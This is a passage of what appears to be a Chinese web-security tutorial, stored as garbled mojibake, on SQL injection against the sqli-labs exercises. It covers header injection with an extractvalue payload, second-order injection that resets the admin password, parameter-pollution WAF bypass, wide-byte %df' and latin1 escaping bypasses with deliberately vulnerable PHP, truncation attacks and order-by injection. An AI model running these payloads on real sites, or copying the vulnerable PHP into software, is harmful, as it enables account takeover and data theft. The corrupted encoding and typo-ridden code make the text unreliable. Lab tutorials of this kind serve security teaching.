æµè§ˆå™¨è¡¨æ˜è‡ªå·±çš„èº«ä»½ï¼ˆæ˜¯å“ªç§æµè§ˆå™¨ï¼‰ã€‚ä¾‹å¦‚ï¼šUser-Agentï¼šMozilla/5.0(Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2ã€0ã€0ã€14 29ã€Transfer-Encoding: WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±å¯¹æœ¬å“åº”æ¶ˆæ¯ä½“ï¼ˆä¸æ˜¯æ¶ˆæ¯ä½“é‡Œé¢çš„å¯¹è±¡ï¼‰ä½œäº†æ€æ ·çš„ç¼–ç ï¼Œæ¯”å¦‚æ˜¯å¦åˆ†å—ï¼ˆchunkedï¼‰ã€‚ä¾‹å¦‚ï¼šTransfer-Encoding: chunked 30ã€Vary: WEB æœåŠ¡å™¨ç”¨è¯¥å¤´éƒ¨çš„å†…å®¹å‘Šè¯‰Cache æœåŠ¡å™¨ï¼Œåœ¨ä»€ä¹ˆæ¡ä»¶ä¸‹æ‰èƒ½ç”¨æœ¬å“åº”æ‰€è¿”å›çš„å¯¹è±¡å“åº”åç»­çš„è¯·æ±‚ã€‚å‡å¦‚æºWEB æœåŠ¡å™¨åœ¨æ¥åˆ°ç¬¬ä¸€ä¸ªè¯·æ±‚æ¶ˆæ¯æ—¶ï¼Œå…¶å“åº”æ¶ˆæ¯çš„å¤´éƒ¨ä¸ºï¼šContent- Encoding: gzip; Vary: Content-Encoding é‚£ä¹ˆCache æœåŠ¡å™¨ä¼šåˆ†æåç»­è¯·æ±‚æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ£€æŸ¥å…¶Accept-Encodingï¼Œæ˜¯å¦è·Ÿå…ˆå‰å“åº”çš„Vary å¤´éƒ¨å€¼ä¸€è‡´ï¼Œå³æ˜¯å¦ä½¿ç”¨ç›¸åŒçš„å†…å®¹ç¼–ç æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢Cache æœåŠ¡å™¨ç”¨è‡ªå·±Cache é‡Œé¢å‹ç¼©åçš„å®ä½“å“åº”ç»™ä¸å…·å¤‡è§£å‹èƒ½åŠ›çš„æµè§ˆå™¨ã€‚ä¾‹å¦‚ï¼šVaryï¼šAccept-Encoding 31ã€Viaï¼š åˆ—å‡ºä»å®¢æˆ·ç«¯åˆ°OCS æˆ–è€…ç›¸åæ–¹å‘çš„å“åº”ç»è¿‡äº†å“ªäº›ä»£ç†æœåŠ¡å™¨ï¼Œä»–ä»¬ç”¨ä»€ä¹ˆåè®®ï¼ˆå’Œç‰ˆæœ¬ï¼‰å‘é€çš„è¯·æ±‚ã€‚å½“å®¢æˆ·ç«¯è¯·æ±‚åˆ°è¾¾ç¬¬ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ—¶ï¼Œè¯¥æœåŠ¡å™¨ä¼šåœ¨è‡ªå·±å‘å‡ºçš„è¯·æ±‚é‡Œé¢æ·»åŠ Via å¤´éƒ¨ï¼Œå¹¶å¡«ä¸Šè‡ªå·±çš„ç›¸å…³ä¿¡æ¯ï¼Œå½“ä¸‹ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ”¶åˆ°ç¬¬ä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚æ—¶ï¼Œä¼šåœ¨è‡ªå·±å‘å‡ºçš„è¯·æ±‚é‡Œé¢å¤åˆ¶å‰ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚çš„Via å¤´éƒ¨ï¼Œå¹¶æŠŠè‡ªå·±çš„ç›¸å…³ä¿¡æ¯åŠ åˆ°åé¢ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå½“OCS æ”¶åˆ°æœ€åä¸€ä¸ªä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚æ—¶ï¼Œæ£€æŸ¥Via å¤´éƒ¨ï¼Œå°±çŸ¥é“è¯¥è¯·æ±‚æ‰€ç»è¿‡çš„è·¯ç”±ã€‚ä¾‹å¦‚ï¼šViaï¼š1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13)</p><p><strong>sqli-labs/less18</strong></p><p>ä»ä»£ç ä¸­çœ‹åˆ°</p><pre class="language-none"><code class="language-none">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent','$IP', $uname)";</code></pre><p>å°†useragent å’Œip æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ³¨å…¥å‘¢ï¼Ÿ</p><p>å°†<code>user-agent</code> ä¿®æ”¹ä¸º<code>'and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and '1'='1;</code></p><h2 id="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“"><a href="#åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“" class="headerlink" title="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)"></a>åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)</h2><h3 id="ä¸€é˜¶æ³¨å°„"><a href="#ä¸€é˜¶æ³¨å°„" class="headerlink" title="ä¸€é˜¶æ³¨å°„"></a>ä¸€é˜¶æ³¨å°„</h3><h3 id="äºŒé˜¶æ³¨å°„"><a href="#äºŒé˜¶æ³¨å°„" class="headerlink" title="äºŒé˜¶æ³¨å°„"></a>äºŒé˜¶æ³¨å°„</h3><p>ä¸€é˜¶æ³¨å°„æ˜¯æŒ‡è¾“å…¥çš„æ³¨å°„è¯­å¥å¯¹WEB ç›´æ¥äº§ç”Ÿäº†å½±å“ï¼Œå‡ºç°äº†ç»“æœï¼›äºŒé˜¶æ³¨å…¥ç±»ä¼¼å­˜å‚¨å‹XSSï¼Œæ˜¯æŒ‡è¾“å…¥æäº¤çš„è¯­å¥ï¼Œæ— æ³•ç›´æ¥å¯¹WEB åº”ç”¨ç¨‹åºäº§ç”Ÿå½±å“ï¼Œé€šè¿‡å…¶å®ƒçš„è¾…åŠ©é—´æ¥çš„å¯¹WEB äº§ç”Ÿå±å®³ï¼Œè¿™æ ·çš„å°±è¢«ç§°ä¸ºæ˜¯äºŒé˜¶æ³¨å…¥.</p><p><strong>sqli-labs/Less-24</strong></p><p>äºŒæ¬¡æ’åºæ³¨å…¥æ€è·¯ï¼š</p><ol><li>é»‘å®¢é€šè¿‡æ„é€ æ•°æ®çš„å½¢å¼ï¼Œåœ¨æµè§ˆå™¨æˆ–è€…å…¶ä»–è½¯ä»¶ä¸­æäº¤HTTP æ•°æ®æŠ¥æ–‡è¯·æ±‚åˆ°æœåŠ¡ç«¯è¿›è¡Œå¤„ç†ï¼Œæäº¤çš„æ•°æ®æŠ¥æ–‡è¯·æ±‚ä¸­å¯èƒ½åŒ…å«äº†é»‘å®¢æ„é€ çš„SQL è¯­å¥æˆ–è€…å‘½ä»¤ã€‚</li><li>æœåŠ¡ç«¯åº”ç”¨ç¨‹åºä¼šå°†é»‘å®¢æäº¤çš„æ•°æ®ä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼Œé€šå¸¸æ˜¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œä¿å­˜çš„æ•°æ®ä¿¡æ¯çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œå…¶ä»–åŠŸèƒ½æä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚åšå‡ºå“åº”ã€‚</li><li>é»‘å®¢å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯ã€‚</li><li>æœåŠ¡ç«¯æ¥æ”¶åˆ°é»‘å®¢æäº¤çš„ç¬¬äºŒä¸ªè¯·æ±‚ä¿¡æ¯åï¼Œä¸ºäº†å¤„ç†è¯¥è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¼šæŸ¥è¯¢æ•°æ®åº“ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´é»‘å®¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„SQL è¯­å¥æˆ–è€…å‘½ä»¤åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œã€‚</li><li>æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœæ•°æ®ä¿¡æ¯åˆ¤æ–­äºŒæ¬¡æ³¨å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸã€‚æ­¤ä¾‹å­ä¸­æˆ‘ä»¬çš„æ­¥éª¤æ˜¯æ³¨å†Œä¸€ä¸ªadminâ€™#çš„è´¦å·ï¼Œæ¥ä¸‹æ¥ç™»å½•è¯¥å¸å·åè¿›è¡Œä¿®æ”¹å¯†ç ã€‚æ­¤æ—¶ä¿®æ”¹çš„å°±æ˜¯admin çš„å¯†ç ã€‚Sql è¯­å¥å˜ä¸ºUPDATE users SET passwd=â€New_Passâ€ WHERE username =â€™ adminâ€™ # â€˜ AND password=â€™ ï¼Œ ä¹Ÿå°±æ˜¯æ‰§è¡Œäº†UPDATE users SET passwd=â€New_Passâ€ WHERE username =â€™adminâ€™</li></ol><p>æ­¥éª¤æ¼”ç¤ºï¼š ï¼ˆ1ï¼‰åˆå§‹æ•°æ®åº“ä¸º</p><p>ï¼ˆ2ï¼‰æ³¨å†Œadminâ€™#è´¦å·</p><p>æ³¨æ„æ­¤æ—¶çš„æ•°æ®åº“ä¸­å‡ºç°äº†adminâ€™#çš„ç”¨æˆ·ï¼ŒåŒæ—¶admin çš„å¯†ç ä¸º123</p><p>ï¼ˆ4ï¼‰ç™»å½•adminâ€™#ï¼Œå¹¶ä¿®æ”¹å¯†ç </p><p>å¯ä»¥çœ‹åˆ°admin çš„å¯†ç å·²ç»ä¿®æ”¹ä¸º1111</p><h2 id="æœåŠ¡å™¨ï¼ˆä¸¤å±‚ï¼‰æ¶æ„"><a href="#æœåŠ¡å™¨ï¼ˆä¸¤å±‚ï¼‰æ¶æ„" class="headerlink" title="æœåŠ¡å™¨ï¼ˆä¸¤å±‚ï¼‰æ¶æ„"></a>æœåŠ¡å™¨ï¼ˆä¸¤å±‚ï¼‰æ¶æ„</h2><p>æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†ä¸ºtomcat ä¸ºå¼•æ“çš„jsp å‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºapacheä¸ºå¼•æ“çš„php æœåŠ¡å™¨ï¼ŒçœŸæ­£æä¾›web æœåŠ¡çš„æ˜¯php æœåŠ¡å™¨ã€‚å·¥ä½œæµç¨‹ä¸ºï¼šclient è®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ°tomcat æœåŠ¡å™¨ï¼Œç„¶åtomcat æœåŠ¡å™¨å†å‘apache æœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚</p><p>é‡ç‚¹ï¼šindex.php?id=1&amp;id=2ï¼Œä½ çŒœçŒœåˆ°åº•æ˜¯æ˜¾ç¤ºid=1 çš„æ•°æ®è¿˜æ˜¯æ˜¾ç¤ºid=2 çš„ï¼Ÿ</p><p>Explainï¼šapacheï¼ˆphpï¼‰è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid=2 çš„å†…å®¹ã€‚Tomcatï¼ˆjspï¼‰è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ˜¾ç¤ºid=1 çš„å†…å®¹ã€‚</p><p>ä»¥ä¸Šå›¾ç‰‡ä¸ºå¤§å¤šæ•°æœåŠ¡å™¨å¯¹äºå‚æ•°è§£æçš„ä»‹ç»ã€‚ æ­¤å¤„æˆ‘ä»¬æƒ³ä¸€ä¸ªé—®é¢˜ï¼šindex.jsp?id=1&amp;id=2 è¯·æ±‚ï¼Œé’ˆå¯¹ç¬¬ä¸€å¼ å›¾ä¸­çš„æœåŠ¡å™¨é…ç½®æƒ…å†µï¼Œå®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¿‡tomcatï¼Œtomcat è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥tomcat å»è¯·æ±‚apacheï¼ˆphpï¼‰æœåŠ¡å™¨ï¼Œapache è§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚é‚£æœ€ç»ˆè¿”å›å®¢æˆ·ç«¯çš„åº”è¯¥æ˜¯å“ªä¸ªå‚æ•°ï¼ŸAnswerï¼šæ­¤å¤„åº”è¯¥æ˜¯id=2 çš„å†…å®¹ï¼Œåº”ä¸ºæ—¶é—´ä¸Šæä¾›æœåŠ¡çš„æ˜¯apacheï¼ˆphpï¼‰æœåŠ¡å™¨ï¼Œè¿”å›çš„æ•°æ®ä¹Ÿåº”è¯¥æ˜¯apache å¤„ç†çš„æ•°æ®ã€‚è€Œåœ¨æˆ‘ä»¬å®é™…åº”ç”¨ä¸­ï¼Œä¹Ÿæ˜¯æœ‰ä¸¤å±‚æœåŠ¡å™¨çš„æƒ…å†µï¼Œé‚£ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Ÿæ˜¯å› ä¸ºæˆ‘ä»¬å¾€å¾€åœ¨tomcat æœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFã€‚è€Œæ­£å› ä¸ºè§£æå‚æ•°çš„ä¸åŒï¼Œæˆ‘ä»¬æ­¤å¤„å¯ä»¥åˆ©ç”¨è¯¥åŸç†ç»•è¿‡WAF çš„æ£€æµ‹ã€‚è¯¥ç”¨æ³•å°±æ˜¯HPPï¼ˆHTTP Parameter Pollutionï¼‰ï¼Œhttp å‚æ•°æ±¡æŸ“æ”»å‡»çš„ä¸€ä¸ªåº”ç”¨ã€‚HPP å¯å¯¹æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½èƒ½å¤Ÿé€ æˆä¸€å®šçš„å¨èƒã€‚</p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>åœ¨äº†è§£å®½å­—èŠ‚æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€çœ‹å­—ç¬¦é›†æ˜¯ä»€ä¹ˆã€‚ å­—ç¬¦é›†ä¹Ÿå«å­—ç¬¦ç¼–ç ï¼Œæ˜¯ä¸€ç§å°†ç¬¦å·è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°çš„æ˜ å°„å…³ç³»ã€‚ å‡ ç§å¸¸è§çš„å­—ç¬¦é›†ï¼š <code>ASCII</code>ç¼–ç ï¼šå•å­—èŠ‚ç¼–ç  <code>latin1</code>ç¼–ç ï¼šå•å­—èŠ‚ç¼–ç  <code>gbk</code>ç¼–ç ï¼šä½¿ç”¨ä¸€å­—èŠ‚å’ŒåŒå­—èŠ‚ç¼–ç ï¼Œ<code>0x00-0x7F</code>èŒƒå›´å†…æ˜¯ä¸€ä½ï¼Œå’Œ<code>ASCII</code> ä¿æŒä¸€è‡´ã€‚åŒå­—èŠ‚çš„ç¬¬ä¸€å­—èŠ‚èŒƒå›´æ˜¯<code>0x81-0xFE</code> <code>UTF-8</code>ç¼–ç ï¼šä½¿ç”¨ä¸€è‡³å››å­—èŠ‚ç¼–ç ï¼Œ<code>0x00â€“0x7F</code>èŒƒå›´å†…æ˜¯ä¸€ä½ï¼Œå’Œ<code>ASCII</code> ä¿æŒä¸€è‡´ã€‚å…¶å®ƒå­—ç¬¦ç”¨äºŒè‡³å››ä¸ªå­—èŠ‚å˜é•¿è¡¨ç¤ºã€‚</p><p>å®½å­—èŠ‚å°±æ˜¯ä¸¤ä¸ªä»¥ä¸Šçš„å­—èŠ‚ï¼Œå®½å­—èŠ‚æ³¨å…¥äº§ç”Ÿçš„åŸå› å°±æ˜¯å„ç§å­—ç¬¦ç¼–ç çš„ä¸å½“æ“ä½œï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡å®½å­—èŠ‚ç¼–ç ç»•è¿‡SQLæ³¨å…¥é˜²å¾¡ã€‚ é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ª<code>gbk</code>ç¼–ç æ±‰å­—ï¼Œå ç”¨2ä¸ªå­—èŠ‚ã€‚ä¸€ä¸ª<code>utf-8</code>ç¼–ç çš„æ±‰å­—ï¼Œå ç”¨3ä¸ªå­—èŠ‚ã€‚</p><p>å®½å­—èŠ‚æ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸PHPç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚PHPçš„ç¼–ç ä¸ºUTF-8 è€ŒMySqlçš„ç¼–ç è®¾ç½®ä¸ºäº†<code>SET NAMES 'gbk' </code>æˆ–æ˜¯<code>SET character_set_client =gbk</code>ï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚</p><pre class="language-none"><code class="language-none">$conn-&gt;query("set names 'gbk';");</code></pre><h3 id="GBKç¼–ç "><a href="#GBKç¼–ç " class="headerlink" title="GBKç¼–ç "></a>GBKç¼–ç </h3><pre class="language-none"><code class="language-none">&lt;?php    $conn = mysqli_connect("127.0.0.1:3307", "root", "root", "db");    if (!$conn) {        die("Connection failed: " . mysqli_connect_error());    } $    conn-&gt;query("set names 'gbk';");    $username = addslashes(@$_POST['username']);//éå¸¸å®‰å…¨çš„è½¬ä¹‰å‡½æ•°    $password = addslashes(@$_POST['password']);    $sql = "select * from users where username = '$username' and password='$password';";    $rs = mysqli_query($conn,$sql);    echo $sql.'&lt;br&gt;';    if($rs-&gt;fetch_row()){        echo "success";    }else{        echo "fail";} ?&gt;ç”¨æˆ·åè¾“å…¥ï¼šadmin' or 1=1#è½¬ä¹‰åä¸ºï¼š admin\' or 1=1#æ‰§è¡Œè¯­å¥ï¼š... where username='admin\' or 1=1#'ç”¨æˆ·åè¾“å…¥ï¼šadmin%df' or 1=1#è½¬ä¹‰åä¸ºï¼š admin%df\' or 1=1#SET character_set_client ='gbk'åï¼šadminé‹' or 1=1#æ‰§è¡Œè¯­å¥ï¼š... where username='adminé‹' or 1=1#'</code></pre><p><code>%df</code> åƒæ‰<code>\ </code>å…·ä½“çš„åŸå› æ˜¯<code>urlencode(\') </code>= <code>%5c%27</code>ï¼Œæˆ‘ä»¬åœ¨<code>%5c%27</code> å‰é¢æ·»åŠ <code>%df</code>ï¼Œå½¢æˆ<code>%df%5c%27</code>ï¼Œè€Œä¸Šé¢æåˆ°çš„mysql åœ¨GBK ç¼–ç æ–¹å¼çš„ï¼Œç¬¬ä¸€ä½èŒƒå›´ä¸º<code>0x00-0x7F</code>æ—¶ï¼Œå½“ä½œä¸€ä¸ªå­—ç¬¦ã€‚<code>%df</code>ä¸åœ¨è¿™ä¸ªèŒƒå›´å†…ï¼Œå› æ­¤ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤äº‹<code>%df%5c</code> å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ<code>%27</code> åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</p><h3 id="Latin1ç¼–ç "><a href="#Latin1ç¼–ç " class="headerlink" title="Latin1ç¼–ç "></a>Latin1ç¼–ç </h3><pre class="language-none"><code class="language-none">$mysqli = new mysqli( "localhost","root","root","cat");if($mysqli-&gt;connect_errno){    printf("failed: %s\n", Smysqli-&gt;connect_error);    exit();}$mysqli-&gt;query("set names utf8");$username= addslashes($_GET['username']);//æˆ‘ä»¬åœ¨å…¶åŸºç¡€ä¸Šæ·»åŠ è¿™ä¹ˆä¸€æ¡è¯­å¥ã€‚if($username === 'admin'){    die("You can't do this");}$sqL= "SELECT * FROM `table1` WHERE username='{$username}'";if($result = $mysqli-&gt;query($sql)){    printf("select returned %d rous.\n",$resule-&gt;num_rows);    while ($row = $result-&gt;fetch_ array(MYSQLI_ASSOC))    {        var_ dump($row);          }    $resule-&gt;close();}else{    var_dump($mysqli-&gt;error);}$mysqli-&gt;close();?&gt;</code></pre><p>SQLè¯­å¥ä¼šå…ˆè½¬æˆ<code>character_set_client</code>è®¾ç½®çš„ç¼–ç ã€‚ä½†ä»–æ¥ä¸‹æ¥è¿˜ä¼šç»§ç»­è½¬æ¢ã€‚<code>character_set_client</code>å®¢æˆ·ç«¯å±‚è½¬æ¢å®Œæ¯•ä¹‹åï¼Œæ•°æ®å°†ä¼šäº¤ç»™<code>character_set_connection</code>è¿æ¥å±‚å¤„ç†ï¼Œæœ€ååœ¨ä»<code>character_set_connection</code>è½¬åˆ°æ•°æ®è¡¨çš„å†…éƒ¨æ“ä½œå­—ç¬¦é›†ã€‚</p><p>å­—ç¬¦é›†çš„è½¬æ¢ä¸ºï¼š<code>UTF-8â€”&gt;UTF-8-&gt;Latin1</code></p><p>UTF-8ç¼–ç æ˜¯å˜é•¿ç¼–ç ï¼Œå¯èƒ½æœ‰1~4ä¸ªå­—èŠ‚è¡¨ç¤ºï¼š</p><p>â€¢ ä¸€å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[00-7F]</code> â€¢ ä¸¤å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[C0-DF][80-BF]</code> â€¢ ä¸‰å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[E0-EF][80-BF][80-BF]</code> â€¢ å››å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[F0-F7][80-BF][80-BF</code>][80-BF] ç„¶åæ ¹æ®<code>RFC 3629</code>è§„èŒƒï¼Œåˆæœ‰ä¸€äº›å­—èŠ‚å€¼æ˜¯ä¸å…è®¸å‡ºç°åœ¨<code>UTF-8</code>ç¼–ç ä¸­çš„ï¼š</p><p>æ‰€ä»¥æœ€ç»ˆï¼ŒUTF-8ç¬¬ä¸€å­—èŠ‚çš„å–å€¼èŒƒå›´æ˜¯ï¼š<code>00-7F</code>ã€<code>C2-F4</code>ã€‚</p><p>è¾“å…¥ï¼š<code>?username=admin%c2</code> å…¶ä¸­<code>%c2</code>æ˜¯ä¸€ä¸ª<code>Latin1</code>å­—ç¬¦é›†ä¸å­˜åœ¨çš„å­—ç¬¦ã€‚<code>%00-%7F</code>å¯ä»¥ç›´æ¥è¡¨ç¤ºæŸä¸ªå­—ç¬¦ã€<code>%C2-%F4</code>ä¸å¯ä»¥ç›´æ¥è¡¨ç¤ºæŸä¸ªå­—ç¬¦è€Œåªæ˜¯å…¶ä»–é•¿å­—èŠ‚ç¼–ç ç»“æœçš„é¦–å­—èŠ‚ã€‚</p><p>å¯¹äºä¸å®Œæ•´çš„é•¿å­—èŠ‚UTF-8ç¼–ç çš„å­—ç¬¦ï¼Œè¿›è¡Œå­—ç¬¦é›†è½¬æ¢æ—¶ä¼šç›´æ¥å¿½ç•¥ï¼Œæ‰€ä»¥<code>admin%c2</code>ä¼šå˜æˆ<code>admin</code></p><h2 id="çº¦æŸæ”»å‡»"><a href="#çº¦æŸæ”»å‡»" class="headerlink" title="çº¦æŸæ”»å‡»"></a>çº¦æŸæ”»å‡»</h2><p>å½“æ•°æ®åº“å­—ç¬¦ä¸²é•¿åº¦è¿‡çŸ­ï¼Œå¹¶ä¸”åç«¯æ²¡æœ‰å¯¹å­—ç¬¦ä¸²è¿›è¡Œé•¿åº¦é™åˆ¶æ—¶</p><pre class="language-none"><code class="language-none">CREATE TABLE users(    username varchar(20),    password varchar(20))</code></pre><p>æ¼æ´ä»£ç é€»è¾‘å¦‚ä¸‹ï¼š</p><p>ä»£ç ç”±ç™»å½•å’Œæ³¨å†Œæ„æˆã€‚</p><p>1.ç”¨<code>select * from table where username='$username'</code>æ£€æµ‹ä½ è¾“å…¥çš„ç”¨æˆ·åï¼Œå¦‚æœå­˜åœ¨ï¼Œè¯´æ˜ä½ æ³¨å†Œè¿‡ï¼Œé‚£ä¹ˆä¸è®©ä½ æ³¨å†Œã€‚</p><p>2.ç”¨æˆ·åä¸å­˜åœ¨ï¼Œç”¨<code>insert into table values('$username','$password')</code>æŠŠä½ è¾“å…¥çš„ç”¨æˆ·åå¯†ç æ’å…¥æ•°æ®åº“ã€‚</p><p><code>insert</code>å’Œ<code>select</code>è¯­å¥æ‰§è¡Œä¸ä¸€æ ·é€ æˆ</p><p><code>INSERT</code>è¯­å¥ï¼šæˆªå–å‰20ä¸ªå­—ç¬¦ <code>SELECT</code>è¯­å¥ï¼šè¾“å…¥ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆ</p><p>å½“æˆ‘ä»¬æ³¨å†Œæ—¶å­—ç¬¦ä¸²é•¿åº¦è¶…è¿‡20ï¼Œé‚£ä¹ˆä½¿ç”¨<code>select</code>æ£€æµ‹æ—¶å°±ä¼šä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨<code>insert</code>æ’å…¥ï¼Œè¿™æ—¶å€™ç”±äºé•¿åº¦è¶…è¿‡20ï¼Œæˆªå–å‰20ä¸ªå­—ç¬¦ã€‚</p><p>æ³¨å†Œ<code>admin a</code> -&gt; <code>SELECT</code>è®¤ä¸ºä¸å­˜åœ¨-&gt; <code>INSERT</code>äº†å‰20ä½-&gt; ä½¿ç”¨è‡ªå·±æ³¨å†Œçš„<code>admin</code>å’Œå¯¹åº”å¯†ç è¿›è¡Œç™»å½•~</p><pre class="language-none"><code class="language-none">INSERTæ’å…¥äº†admin+15ç©ºæ ¼ï¼Œå®é™…ä¸Šæ˜¯æ’å…¥äº†adminï¼Œæœ«å°¾çš„ç©ºæ ¼ä¼šè¢«MySQLå¿½ç•¥æ‰</code></pre><p>è¿™æ ·å°±ä¿®æ”¹äº†<code>admin</code>çš„å¯†ç äº†</p><h2 id="order-by-åçš„injection"><a href="#order-by-åçš„injection" class="headerlink" title="order by åçš„injection"></a>order by åçš„injection</h2><h3 id="order-byå‚æ•°åæ³¨å…¥"><a href="#order-byå‚æ•°åæ³¨å…¥" class="headerlink" title="order byå‚æ•°åæ³¨å…¥"></a>order byå‚æ•°åæ³¨å…¥</h3><p>ä»æœ¬å…³å¼€å§‹ï¼Œæˆ‘ä»¬å¼€å§‹å­¦ä¹ order by ç›¸å…³æ³¨å…¥çš„çŸ¥è¯†ã€‚æœ¬å…³çš„sql è¯­å¥ä¸º$sql = â€œSELECT * FROM users ORDER BY $idâ€;å°è¯•?sort=1 desc æˆ–è€…ascï¼Œæ˜¾ç¤ºç»“æœä¸åŒï¼Œåˆ™è¡¨æ˜å¯ä»¥æ³¨å…¥ã€‚ï¼ˆå‡åºor é™åºæ’åˆ—ï¼‰ä»ä¸Šè¿°çš„sql è¯­å¥ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬çš„æ³¨å…¥ç‚¹åœ¨order by åé¢çš„å‚æ•°ä¸­ï¼Œè€Œorder byä¸åŒäºçš„æˆ‘ä»¬åœ¨where åçš„æ³¨å…¥ç‚¹ï¼Œä¸èƒ½ä½¿ç”¨union ç­‰è¿›è¡Œæ³¨å…¥ã€‚å¦‚ä½•è¿›è¡Œorder by çš„æ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹mysql å®˜æ–¹select çš„æ–‡æ¡£ã€‚</p><pre class="language-none"><code class="language-none">SELECT     [ALL | DISTINCT | DISTINCTROW ]       [HIGH_PRIORITY]       [STRAIGHT_JOIN]       [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]       [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]     select_expr [, select_expr ...]     [FROM table_references     [WHERE where_condition]     [GROUP BY {col_name | expr | position}       [ASC | DESC], ... [WITH ROLLUP]]     [HAVING where_condition]     [ORDER BY {col_name | expr | position}       [ASC | DESC], ...]     [LIMIT {[offset,] row_count | row_count OFFSET offset}]     [PROCEDURE procedure_name(argument_list)]     [INTO OUTFILE 'file_name' export_options       | INTO DUMPFILE 'file_name'       | INTO var_name [, var_name]]     [FOR UPDATE | LOCK IN SHARE 